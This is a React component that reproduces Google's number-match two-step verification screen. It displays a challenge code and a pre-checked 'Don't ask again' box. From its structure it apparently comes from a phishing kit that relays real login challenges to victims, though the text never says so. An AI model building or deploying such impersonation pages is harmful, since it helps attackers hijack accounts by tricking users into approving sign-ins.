import { ChallengeMetadata } from "@/lib/types";
import React from "react";

const NumberPickerView: React.FC<{
  challengeMetadata: ChallengeMetadata | null;
}> = ({ challengeMetadata }) => {
  return (
    <div className="flex flex-col items-start w-full animate-in fade-in slide-in-from-right-4 duration-500">
      {/* Verification Number Circle at Top Right */}
      <div className="flex justify-center w-full mb-6">
        <div className="w-[84px] h-[84px] rounded-full flex items-center justify-center">
          <span className="text-[44px] leading-none font-medium text-[#1f1f1f] tracking-tight">
            {challengeMetadata?.verificationNumber ||
              challengeMetadata?.pushCode}
          </span>
        </div>
      </div>

      <h2 className="text-[22px] font-normal text-[#1f1f1f] mb-3 leading-[28px]">
        Open the Gmail app on your phone
      </h2>

      <p className="text-[14px] text-[#444746] leading-[20px] font-normal mb-8">
        Google sent a notification to your phone. Open the Gmail app, tap Yes on the prompt, then tap{" "}
        <span className="text-[14px] text-[#1f1f1f] leading-[20px] font-normal">
          {challengeMetadata?.verificationNumber}
        </span>{" "}
        on your phone to verify it&apos;s you.
      </p>
      <div className="flex items-center gap-2">
        <input type="checkbox" checked id="remember" className="w-4 h-4" />
        <label htmlFor="remember" className="text-[14px] text-[#444746] leading-[20px] font-normal">Don’t ask again on this device</label>
      </div>
    </div>
  );
};

export default NumberPickerView;
